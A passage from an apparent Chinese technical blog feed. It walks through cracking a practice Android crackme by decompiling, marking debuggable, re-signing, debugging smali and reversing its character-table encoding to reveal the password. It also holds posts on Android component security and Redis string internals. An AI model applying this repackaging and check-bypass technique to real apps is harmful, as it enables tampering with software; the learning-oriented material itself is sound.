src="https://imgconvert.csdnimg.cn/aHR0cDovL2ltZy5ibG9nLmNzZG4ubmV0LzIwMTcwNzE5MDgzNjUzMDA3?x-oss-process=image/format,png" alt="这里写图片描述"></p><p>步骤四：反编译apk，修改AndroidManifest.xml文件的属性android:debuggable=”true”</p><pre><code>java -jar apktool.jar d -d ./apk/AliCrackme_1.apk -o out</code></pre><p><img src="https://imgconvert.csdnimg.cn/aHR0cDovL2ltZy5ibG9nLmNzZG4ubmV0LzIwMTcwNzE5MDgzNzEzMzk0?x-oss-process=image/format,png" alt="这里写图片描述"></p><p>修改完成之后，回编译apk</p><pre><code>java -jar apktool.jar b -d out -o debug.apk</code></pre><p>回编之后，进行签名</p><pre><code>java -jar .\sign\signapk.jar .\sign\testkey.x509.pem .\sign\testkey.pk8 debug.apk debug.sig.apk</code></pre><p>步骤五：安装签名之后的应用</p><pre><code>adb install debug.sig.apk</code></pre><p>使用backsmali得到apk的smali代码</p><pre><code>java -jar backsmali.jar debug.sig.apk</code></pre><p>将得到的smali代码导入Android Studio中</p><p>步骤六：配置远程调试的选项，选择Run–&gt;Edit Configurations：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cDovL2ltZy5ibG9nLmNzZG4ubmV0LzIwMTcwNzE5MDgzNzM4NzA0?x-oss-process=image/format,png" alt="这里写图片描述"></p><p>增加一个Remote调试的调试选项，端口选择:8700</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cDovL2ltZy5ibG9nLmNzZG4ubmV0LzIwMTcwNzE5MDgzNzU3OTg4?x-oss-process=image/format,png" alt="这里写图片描述"></p><p>步骤七：下好断点，针对本APK我们在button的onclik函数出下断点（点击鼠标右键）</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cDovL2ltZy5ibG9nLmNzZG4ubmV0LzIwMTcwNzE5MDgzODI0Nzg2?x-oss-process=image/format,png" alt="这里写图片描述"></p><p>步骤八：以调试状态启动app</p><pre><code>adb shell am start -D -n com.example.simpleencryption/.MainActivity</code></pre><p>下好断点之后Run-&gt;Debug<br>执行完</p><pre><code>invoke-virtual {v6}, Lcom/example/simpleencryption/MainActivity;-&gt;getTableFromPic()Ljava/lang/String;</code></pre><p>得到图6内容</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cDovL2ltZy5ibG9nLmNzZG4ubmV0LzIwMTcwNzE5MDgzOTE5MzM4?x-oss-process=image/format,png" alt="这里写图片描述"></p><p>通过分析我们大体知道个整个函数的执行逻辑</p><ol><li>通过MainActivity中的getTableFromPic方法，获取一个类似密码表的东西</li><li>通过MainActivity中的getPwdFromPic方法，获取正确的密码”义弓么丸广之”</li><li>获取我们输入内容的utf-8的字节码，然后调用MainActivity的access$0方法，获取加密之后的内容</li></ol><p><img src="https://imgconvert.csdnimg.cn/aHR0cDovL2ltZy5ibG9nLmNzZG4ubmV0LzIwMTcwNzE5MDgzOTQzNzIy?x-oss-process=image/format,png" alt="这里写图片描述"></p><ol start="4"><li>再看MainActivity的access$0方法的实现</li></ol><p><img src="https://imgconvert.csdnimg.cn/aHR0cDovL2ltZy5ibG9nLmNzZG4ubmV0LzIwMTcwNzE5MDg0MDE0MTcw?x-oss-process=image/format,png" alt="这里写图片描述"></p><p>里面又调用了bytesToAliSmsCode，传了两个参数，一个是我们输入的qwer的bytes数组，一个是获取的密码表</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cDovL2ltZy5ibG9nLmNzZG4ubmV0LzIwMTcwNzE5MDg0MTI3Mzk5?x-oss-process=image/format,png" alt="这里写图片描述"></p><p>具体的逻辑如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">.method private static bytesToAliSmsCode(Ljava&#x2F;lang&#x2F;String;[B)Ljava&#x2F;lang&#x2F;String;</span><br><span class="line">    .registers 5</span><br><span class="line">    .param p0, &quot;table&quot;    # Ljava&#x2F;lang&#x2F;String;</span><br><span class="line">    .param p1, &quot;data&quot;    # [B</span><br><span class="line"></span><br><span class="line">    .prologue</span><br><span class="line">    .line 144</span><br><span class="line">    new-instance v1, Ljava&#x2F;lang&#x2F;StringBuilder;</span><br><span class="line"></span><br><span class="line">    invoke-direct &#123;v1&#125;, Ljava&#x2F;lang&#x2F;StringBuilder;-&gt;&lt;init&gt;()V</span><br><span class="line"></span><br><span class="line">    .line 145</span><br><span class="line">    .local v1, &quot;sb&quot;:Ljava&#x2F;lang&#x2F;StringBuilder;    &#x2F;&#x2F;创建一个StringBuilder的变量sb</span><br><span class="line">    const&#x2F;4 v0, 0x0</span><br><span class="line"></span><br><span class="line">    .local v0, &quot;i&quot;:I    &#x2F;&#x2F; 定义一个int变量i &#x3D; 0</span><br><span class="line">    :goto_6</span><br><span class="line">    array-length v2, p1</span><br><span class="line"></span><br><span class="line">    if-lt v0, v2, :cond_e   &#x2F;&#x2F; 比较i和data数组的长度，如果小于，跳到cond_e</span><br><span class="line"></span><br><span class="line">    .line 148</span><br><span class="line">    invoke-virtual &#123;v1&#125;, Ljava&#x2F;lang&#x2F;StringBuilder;-&gt;toString()Ljava&#x2F;lang&#x2F;String;</span><br><span class="line"></span><br><span class="line">    move-result-object v2</span><br><span class="line"></span><br><span class="line">    return-object v2</span><br><span class="line"></span><br><span class="line">    .line 146</span><br><span class="line">    :cond_e</span><br><span class="line">    aget-byte v2, p1, v0   &#x2F;&#x2F; 取出data[i]</span><br><span class="line"></span><br><span class="line">    and-int&#x2F;lit16 v2, v2, 0xff</span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;p0, v2&#125;, Ljava&#x2F;lang&#x2F;String;-&gt;charAt(I)C   &#x2F;&#x2F; 获取data[i]在table数组的字符</span><br><span class="line"></span><br><span class="line">    move-result v2</span><br><span class="line">    &#x2F;&#x2F; 调用sb的append函数进行拼接</span><br><span class="line">    invoke-virtual &#123;v1, v2&#125;, Ljava&#x2F;lang&#x2F;StringBuilder;-&gt;append(C)Ljava&#x2F;lang&#x2F;StringBuilder;</span><br><span class="line"></span><br><span class="line">    .line 145</span><br><span class="line">    add-int&#x2F;lit8 v0, v0, 0x1</span><br><span class="line"></span><br><span class="line">    goto :goto_6</span><br><span class="line">.end method</span><br></pre></td></tr></table></figure><p>整体逻辑就是一个循环，将输入字符转化为utf-8格式的bye数组，然后取出data[i]table表中所对应的字符，然后拼接返回<br> 5. 返回字符串与正确密码”义弓么丸广之”比较<br> invoke-virtual {v4, v6}, Ljava/lang/String;-&gt;equals(Ljava/lang/Object;)Z<br> 此时我们输入的qwer加密后与”义弓么丸广之”<br>肯定不相等，所以这里我们可以想办法是的输入的字符串加密等于”义弓么丸广之”</p><p><strong>怎么办呢？</strong></p><p>我们可以将bytesToAliSmsCode进行反向实现，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String args[])&#123;</span><br><span class="line">String table &#x3D; &quot;一乙二十丁厂七卜人入八九几儿了力乃刀又三于干亏士工土才寸下大丈与万上小口巾山千乞川亿个勺久凡及夕丸么广亡门义之尸弓己已子卫也女飞刃习叉马乡丰王井开夫天无元专云扎艺木五支厅不太犬区历尤友匹车巨牙屯比互切瓦止少日中冈贝内水见午牛手毛气升长仁什片仆化仇币仍仅斤爪反介父从今凶分乏公仓月氏勿欠风丹匀乌凤勾文六方火为斗忆订计户认心尺引丑巴孔队办以允予劝双书幻玉刊示末未击打巧正扑扒功扔去甘世古节本术可丙左厉右石布龙平灭轧东卡北占业旧帅归且旦目叶甲申叮电号田由史只央兄叼叫另叨叹四生失禾丘付仗代仙们仪白仔他斥瓜乎丛令用甩印乐&quot;;</span><br><span class="line">String dataString &#x3D; &quot;义弓么丸广之&quot;;</span><br><span class="line">String passwd  &#x3D; &quot;&quot;;</span><br><span class="line">for(int i &#x3D; 0 ; i &lt; dataString.length(); i++)&#123;</span><br><span class="line">passwd +&#x3D; (char)table.indexOf(dataString.charAt(i));</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(&quot;passwd &#x3D; &quot; + passwd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行出的结果为passwd = 581026就是我们输入框里面要输入的字符串</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Android-Studio调试smali代码&quot;&gt;&lt;a href=&quot;#Android-Studio调试smali代码&quot; class=&quot;headerlink&quot; title=&quot;Android Studio调试smali代码&quot;&gt;&lt;/a&gt;Android Studio调试s
      
    
    </summary>
    
    
      <category term="移动安全" scheme="https://blog.kaide0521.cn/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="android安全" scheme="https://blog.kaide0521.cn/tags/android%E5%AE%89%E5%85%A8/"/>
    
      <category term="smali代码" scheme="https://blog.kaide0521.cn/tags/smali%E4%BB%A3%E7%A0%81/"/>
    
      <category term="APK逆向分析" scheme="https://blog.kaide0521.cn/tags/APK%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>Android组件安全</title>
    <link href="https://blog.kaide0521.cn/2020/01/05/Android%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
    <id>https://blog.kaide0521.cn/2020/01/05/Android%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/</id>
    <published>2020-01-05T13:24:56.000Z</published>
    <updated>2020-01-05T13:25:38.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Android组件安全"><a href="#Android组件安全" class="headerlink" title="Android组件安全"></a><strong>Android组件安全</strong></h2><p>做过Android开发的攻城狮都知道Android四大组件，在开发过程中打交道最多的也是这四大组件，在开发Android应用的过程中我们最基本的要求是要对这四大组件有一个清晰的认识，包括组件的功能特性、生命周期、与系统的交互模型，以及组件之间如何配合使用等等。本文内容主要是关于组件的安全模型以及如何正确的使用组件来降低应用的安全风险的一个学习笔记。</p><h3 id="一、Android四大组件简介"><a href="#一、Android四大组件简介" class="headerlink" title="一、Android四大组件简介"></a><strong>一、Android四大组件简介</strong></h3><h4 id="1-Service组件"><a href="#1-Service组件" class="headerlink" title="1. Service组件"></a><strong>1. Service组件</strong></h4><p>Service是没有界面且能长时间运行于后台的应用组件，是Android中实现程序后台运行的解决方案，非常适合用于去执行那些不需要和用户交互而且还要求长期运行的任务。这也是为了不阻塞主进程，然而主进程依然能够流畅的处理UI事件，提供良好的用户体验。</p><p>根据Service的生命周期不同又分为两种类型：</p><pre><code>（1）start类型：应用程序组件（如activity）调用startService()方法启动服务时，服务处于started状态（2）bound类型：组件调用bindService()方法绑定到服务时，服务处于bound状态</code></pre><p><strong>两者的区别：</strong>调用startService()启动的Service其生命周期与启动它的组件无关，调用bindService()启动的Service会在启动它的组件消亡后消亡</p><p><strong>1.1 Service安全</strong></p><p>关于Service安全规范请参照博客：<a href="http://www.droidsec.cn/android-service-security/" target="_blank" rel="noopener">http://www.droidsec.cn/android-service-security/</a></p><h4 id="2-Activity组件"><a href="#2-Activity组件" class="headerlink" title="2. Activity组件"></a><strong>2. Activity组件</strong></h4><p>Activity是一个Android应用程序和用户进行交互界面的Android组件，相当于应用程序的一个交互屏幕，Activity之间通过Intent进行通信。下图是Activity的生命周期变迁图</p><p><strong>2.1 Activity生命周期</strong></p><p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-bXGiHv3W-1578230663807)(<a href="http://i.imgur.com/CH4adYo.jpg)]" target="_blank" rel="noopener">http://i.imgur.com/CH4adYo.jpg)]</a></p><p><strong>onCreate :</strong> Activity被创建时调用，是生命周期第一个被调用的方法</p><p><strong>onStart :</strong>表示Activity正在启动，还没有到达可见、交互的地步</p><p><strong>onResume :</strong>表示Activity已在前台可见，可与用户交互</p><p><strong>onPause :</strong> 表示Activity正在停止</p><p><strong>onStop :</strong> 一般在onPause方法执行完成直接执行，表示Activity即将停止或者完全被覆盖，此时Activity不可见，仅在后台运行</p><p><strong>onRestart :</strong>表示Activity正在重新启动，当Activity由不可见变为可见状态时，该方法被回调</p><p><strong>onDestroy :</strong>此时Activity正在被销毁，也是生命周期最后一个执行的方法，一般我们可以在此方法中做一些回收工作和最终的资源释放。</p><p><strong>2.2 Activity组件的加载模式</strong></p><ul><li><strong>standard模式</strong>：无论Activity栈中是否存在改Activity实例，系统都将创建一个实例</li><li><strong>singleTop模式</strong>：如果目标activity的实例已经存在于栈顶，系统会直接使用该实例，不会重新创建，否则会创建一个实例，入栈</li><li><strong>singleTask模式</strong>：在同一应用程序中，如果目标activity的实例已经存在于栈顶，系统会直接使用该实例，不会重新创建，否则弹出栈顶实例，直到使目标activity位于栈顶，在不同应用程序中启动Activity时，会创建一个新的task栈，用于保存被启动的Activity实例</li><li><strong>singleInstance模式</strong>：只有一个实例，并且这个实例独立运行在一个task栈中，这个task只有这个实例，不允许有别的Activity存在</li></ul><p><strong>2.2 Activity组件权限</strong></p><p>Activity权限的使用主要用于从其他应用中调用该应用的Activity进行一些操作，比如第三方登录：进行权限的设置后可以调用该应用中的Activity进行操作。下图是权限的格式定义：</p><p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-SAbH4nAO-1578230663808)(<a href="http://i.imgur.com/MSPOUeC.png)]" target="_blank" rel="noopener">http://i.imgur.com/MSPOUeC.png)]</a></p><pre><code>android:protectionLevel 一共有四种</code></pre><ul><li><p><strong>normal：</strong>表示权限是低风险的，不会对系统、用户或其他应用程序造成危害</p></li><li><p><strong>dangerous：</strong>比normal级别要高一等级,可能会赋予应用程序访问敏感数据或控制设备等功能</p></li><li><p><strong>signature：</strong>表示只有当应用程序所用数字签名与声明该权限的应用程序所用数字签名相同时，才能将权限授给它</p></li><li><p><strong>signatureOrSystem ：</strong>表示将权限授给具有相同数字签名的应用程序或android 系统映像/系统app。这一保护级别适和于非常特殊的情况，比如多个供应商需要通过系统映像共享功能时</p></li></ul><p><strong>2.2 exported属性</strong></p><p>一个Activity组件能否被外部应用启动取决于此属性，设置为true时Activity可以被外部应用启动，设置为false则不能，此时Activity只能被自身app启动。（同user id或者root也能启动）</p><p>没有配置intent-filter属性exported默认为false（没有filter只能通过明确的类名来启动activity故相当于只有程序本身能启动），配置了intent-filter属性exported默认为true。</p><p>exported属性只是用于限制Activity是否暴露给其他app，通过配置文件中的权限申明也可以限制外部启动activity。</p><p><strong>2.3 activity的声明</strong></p><pre><code>&lt;activity        android:name=&quot;Activity&quot;        android:label=&quot;@string/title_activity&quot;        android:permission=&quot;packagename.permission.Activity&quot;        &gt;        &lt;intent-filter&gt;            &lt;category android:name=&quot;android.intent.category.DEFAULT&quot;/&gt;            &lt;action android:name=&quot;packagename.intent.action.Activity&quot;/&gt;        &lt;/intent-filter&gt;    &lt;/activity&gt;</code></pre><p>配置了intent-filter属性，则exported为true，说明别的应用程序可以在外部启动该Activity，可根据action的name发起隐式intent，启动声明了该action的Activity</p><p><strong>2.4 activity的分类</strong></p><p><strong>2.4.1 private activity</strong></p><p>私有Activity不应被其他应用启动相对是安全的<br>关于private activity的使用和设置规范请参照：<a href="http://www.bugsec.org/7195.html" target="_blank" rel="noopener">http://www.bugsec.org/7195.html</a></p><p><strong>2.4.2 public activity</strong></p><p>公开暴露的Activity组件，可以被任意应用启动<br>关于public activity的使用和设置规范请参照：<a href="http://www.bugsec.org/7195.html" target="_blank" rel="noopener">http://www.bugsec.org/7195.html</a></p><h4 id="3-Broadcast-Recevier组件"><a href="#3-Broadcast-Recevier组件" class="headerlink" title="3. Broadcast Recevier组件"></a><strong>3. Broadcast Recevier组件</strong></h4><p>Broadcast Recevier 广播接收器是一个专注于接收广播通知信息，并做出对应处理的组件，广播机制是一个典型的发布—订阅模式，即观察者模式。 广播接收器没有用户界面。然而，它们可以启动一个activity来响应它们收到的信息，或者用NotificationManager来通知用户。通知可以用很多种方式来吸引用户的注意力──闪动背灯、震动、播放声音等等。一般来说是在状态栏上放一个持久的图标，用户可以打开它并获取消息。</p><p><strong>3.1 广播注册形式</strong></p><p><strong>静态注册：</strong></p><p>静态注册是在AndroidManifest.xml中声明广播注册，直接在Manifest.xml文件的<application>节点中配置广播接收者。</p><pre><code>&lt;receiver android:name=&quot;.MyBroadCastReceiver&quot;&gt;          &lt;!-- android:priority属性是设置此接收者的优先级（从-1000到1000） --&gt;        &lt;intent-filter android:priority=&quot;20&quot;&gt;        &lt;actionandroid:name=&quot;android.provider.Telephony.SMS_RECEIVED&quot;/&gt;          &lt;/intent-filter&gt;  &lt;/receiver&gt;</code></pre><p>还要在<application>同级的位置配置可能使用到的权限</p><pre><code>&lt;uses-permission android:name=&quot;android.permission.RECEIVE_SMS&quot;&gt;&lt;/uses-permission&gt;</code></pre><p><strong>动态注册：</strong></p><p>通过使用代码进行注册</p><p><strong>区别：</strong></p><ul><li><p>第一种是常驻型，也就是说当应用程序关闭后，如果有信息广播来，程序也会被系统调用自动运行</p></li><li><p>第二种是非常驻型广播，也就是说广播跟随程序的生命周期</p></li></ul><p>关于Broadcast Recevier安全编码规范，参照：<a href="http://www.droidsec.cn/android-broadcast-security/" target="_blank" rel="noopener">http://www.droidsec.cn/android-broadcast-security/</a></p><h4 id="3-Content-Provider组件"><a href="#3-Content-Provider组件" class="headerlink" title="3. Content Provider组件"></a><strong>3. Content Provider组件</strong></h4><p>为存储和获取数据提供统一的接口，可以在不同的应用程序之间共享数据。使用ContentProvider，应用程序可以实现数据共享，android内置的许多数据都是使用ContentProvider形式，供开发者调用的(如视频，音频，图片，通讯录等)</p><p>关于Content Provider组件的安全问题，参照：<a href="http://blog.csdn.net/alimobilesecurity/article/details/51564968" target="_blank" rel="noopener">http://blog.csdn.net/alimobilesecurity/article/details/51564968</a></p><h3 id="参考博文"><a href="#参考博文" class="headerlink" title="参考博文"></a><strong>参考博文</strong></h3><p><a href="http://www.cnblogs.com/smyhvae/p/4070518.html" target="_blank" rel="noopener">http://www.cnblogs.com/smyhvae/p/4070518.html</a></p><p><a href="http://blog.csdn.net/javazejian/article/details/51932554" target="_blank" rel="noopener">http://blog.csdn.net/javazejian/article/details/51932554</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Android组件安全&quot;&gt;&lt;a href=&quot;#Android组件安全&quot; class=&quot;headerlink&quot; title=&quot;Android组件安全&quot;&gt;&lt;/a&gt;&lt;strong&gt;Android组件安全&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;做过Android开发的攻城狮都知
      
    
    </summary>
    
    
      <category term="移动安全" scheme="https://blog.kaide0521.cn/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="android安全" scheme="https://blog.kaide0521.cn/tags/android%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Redis底层数据结构之简单动态字符串</title>
    <link href="https://blog.kaide0521.cn/2020/01/05/Redis%E5%BA%95%E5%B1%82%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%8B%E7%AE%80%E5%8D%95%E5%8A%A8%E6%80%81%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
    <id>https://blog.kaide0521.cn/2020/01/05/Redis%E5%BA%95%E5%B1%82%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%8B%E7%AE%80%E5%8D%95%E5%8A%A8%E6%80%81%E5%AD%97%E7%AC%A6%E4%B8%B2/</id>
    <published>2020-01-05T13:23:18.000Z</published>
    <updated>2020-01-05T13:24:10.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Redis底层数据结构之简单动态字符串"><a href="#Redis底层数据结构之简单动态字符串" class="headerlink" title="Redis底层数据结构之简单动态字符串"></a><strong>Redis底层数据结构之简单动态字符串</strong></h2><p>我们知道在C语言中常常使用空字符’\0’作为字符串的结尾标志，也就是使用N+1的字符数组来表示长度为N的字符串，Redis没有直接使用C语言中的字符串表示，而是构建了自己的一套字符串表示抽象，称为简单动态字符串SDS(simple dynamic string)，至于为什么Redis不采用C语言中的字符串表示方法，这也是我们接下来要探讨的问题，我们首先给出Redis简单动态字符串的数据结构，然后说明相比C语言的字符串表示方法具有的优势</p><h3 id="一、Redis简单动态字符串的数据结构"><a href="#一、Redis简单动态字符串的数据结构" class="headerlink" title="一、Redis简单动态字符串的数据结构"></a><strong>一、Redis简单动态字符串的数据结构</strong></h3><p>接下来我们来看Redis中是如何定义字符串的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">   &#x2F;* Redis简单动态字符串的数据结构 *&#x2F;</span><br><span class="line">struct sdshdr &#123;</span><br><span class="line">&#x2F;&#x2F;字符长度，记录buf数组中已使用的字节数量</span><br><span class="line">   unsigned int len;</span><br><span class="line">   &#x2F;&#x2F;当前可用空间，记录buf数组中未使用的字节数量</span><br><span class="line">   unsigned int free;</span><br><span class="line">   &#x2F;&#x2F;具体存放字符的buf</span><br><span class="line">   char buf[];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="二、Redis采用这种结构保存字符串的原因"><a href="#二、Redis采用这种结构保存字符串的原因" class="headerlink" title="二、Redis采用这种结构保存字符串的原因"></a><strong>二、Redis采用这种结构保存字符串的原因</strong></h3><p>C语言中的字符表示，并不能满足Redis对字符串在安全性、效率以及功能方面的要求，具体体现在一下几点：</p><ul><li><p><strong>获取字符串长度的时间复杂度</strong></p><p>  在C语言中，要获取一个字符串的长度使用strlen函数，要对字符串进行遍历，其时间复杂度为O(N)，而SDS本身记录了字符串的长度即len属性，所以获取一个字符串的长度的实践复杂度为O(1)，特别是Redis的使用环境中存在大量、频繁的字符串操作，如果每次都调用strlen将会严重影响系统性能。</p></li><li><p><strong>缓冲区溢出</strong></p><p>  在C语言中，我们要对一个字符串进行连接操作是，很容易造成缓冲区溢出，比如字符串char A[10] = {‘a’,’b’,’c’,’d’,’\n’}，现在使用连接操作strcat(A,B)，如果在进行连接操作之前未能检查A和B的长度，就会产生缓冲区溢出，这使得程序员在写程序的时候要非常小心，一不小心手滑，就是一个严重的Bug</p><p>  而在redis中，则不存在这样的问题，因为Redis保存了字符串的当前长度和可用空间，在进行连接操作的时候，会自动检查空间是否足够，不够空间系统会自动分配，程序员无需手动修改空间大小，也不会造成缓冲区溢出</p></li><li><p><strong>内存分配与释放</strong></p><p>  在C语言中，我们对字符串进行拼接操作时，容易造成缓冲区溢出，对字符串进行缩减/截断操作时候，如果未能及时释放未使用的字节空间，又很容易造成内存泄露，因此，在Redis中如果每次对字符串的操作都涉及空间重分配，并且在分配的过程中可能涉及到系统调用，通常将是一个非常耗时的操作；</p><p>  <strong>因此在Redis中使用两种优化手段，进行优化</strong></p><p>  <strong>(1) 空间预分配：</strong><br>  当对字符串进行拼接操作时，Redis不仅分配给满足拼接操作所必要的空间，通常还会额外分配一定量的空间供下次拼接操作使用，避免每次拼接操作进行过多的内存重分配。</p><p>  <strong>(2) 分配原则：</strong><br>  如果操作后的字符串长度 &lt; 1MB ，则len的长度和free的长度一样，也就是会额外的分配一倍的空间（具体为什么这么设定还有待考究）<br>  如果操作后的字符串长度 &gt;= 1MB，则Redis会分配额外的1MB未使用空间</p><p>  <strong>(3) 惰性空间释放：</strong><br>  在对字符串进行缩减操作时，Redis不会立即回收缩减掉的部分空间，而是使用free字段记录下来，供下次使用，同时，Redis也提供了相应的API，可以在需要的时候释放掉这些空间，以免造成内存浪费。</p></li></ul><h3 id="三、源码实例分析"><a href="#三、源码实例分析" class="headerlink" title="三、源码实例分析"></a><strong>三、源码实例分析</strong></h3><h4 id="3-1-返回字符串长度的函数sdslen"><a href="#3-1-返回字符串长度的函数sdslen" class="headerlink" title="3.1 返回字符串长度的函数sdslen"></a><strong>3.1 返回字符串长度的函数sdslen</strong></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">  &#x2F;* 计算sds的长度，返回的size_t类型的数值 *&#x2F;</span><br><span class="line">&#x2F;* size_t,它是一个与机器相关的unsigned类型，其大小足以保证存储内存中对象的大小。 *&#x2F;</span><br><span class="line">static inline size_t sdslen(const sds s) &#123;</span><br><span class="line">   struct sdshdr *sh &#x3D; (void*)(s-(sizeof(struct sdshdr)));</span><br><span class="line">   return sh-&gt;len;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;* 根据sdshdr中的free标记获取可用空间 *&#x2F;</span><br><span class="line">static inline size_t sdsavail(const sds s) &#123;</span><br><span class="line">   struct sdshdr *sh &#x3D; (void*)(s-(sizeof(struct sdshdr)));</span><br><span class="line">   return sh-&gt;free;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先来看定义内联函数的好处：</p><pre><code>因为定义为内联函数，所有要用到的地方可能不止一个文件。为了避免多个文件中定义同一个函数出错，所以放到头文件中。</code></pre><p>看到这里大家应该还会有疑问，返回长度为什么要这样操作？我们首先看sds的定义</p><pre><code>typedef char *sds;</code></pre><p>sds是一个char * 类型的指针，这和我们得sdshdr有什么关系呢？我们再看sds的构造过程函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* 根据init函数指针创建字符串 *&#x2F;</span><br><span class="line">sds sdsnew(const char *init) &#123;</span><br><span class="line">    size_t initlen &#x3D; (init &#x3D;&#x3D; NULL) ? 0 : strlen(init);</span><br><span class="line">    return sdsnewlen(init, initlen);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;* 创建新字符串方法，传入目标长度，初始化方法 *&#x2F;</span><br><span class="line">sds sdsnewlen(const void *init, size_t initlen) &#123;</span><br><span class="line">    struct sdshdr *sh;</span><br><span class="line"></span><br><span class="line">    if (init) &#123;</span><br><span class="line">&#x2F;* 调用zmalloc申请size个大小的空间 *&#x2F;  </span><br><span class="line">        sh &#x3D; zmalloc(sizeof(struct sdshdr)+initlen+1);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">    &#x2F;&#x2F;当init函数为NULL时候，调用系统函数calloc函数申请空间 *&#x2F;  </span><br><span class="line">        sh &#x3D; zcalloc(sizeof(struct sdshdr)+initlen+1);</span><br><span class="line">    &#125;</span><br><span class="line">    if (sh &#x3D;&#x3D; NULL) return NULL;</span><br><span class="line">    sh-&gt;len &#x3D; initlen;</span><br><span class="line">    sh-&gt;free &#x3D; 0;</span><br><span class="line">    if (initlen &amp;&amp; init)</span><br><span class="line">        memcpy(sh-&gt;buf, init, initlen);</span><br><span class="line">   &#x2F;&#x2F;最末端同样要加‘\0’结束符</span><br><span class="line">    sh-&gt;buf[initlen] &#x3D; &#39;\0&#39;;</span><br><span class="line">    &#x2F;&#x2F;最后是通过返回字符串结构体sdshdr中的buf代表新的字符串的地址</span><br><span class="line">    return (char*)sh-&gt;buf;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由代码可以看出sdsnewlen函数的返回值是buf的首地址，这样在看sdslen函数，通过给定的sds首地址减去sizeof(sdshdr)，那么就应该是该sds所对应的sdshdr数据结构首地址，自然就能得到sh-&gt;len与sh-&gt;free。</p><h4 id="3-2-字符串的拼接操作"><a href="#3-2-字符串的拼接操作" class="headerlink" title="3.2 字符串的拼接操作"></a><strong>3.2 字符串的拼接操作</strong></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 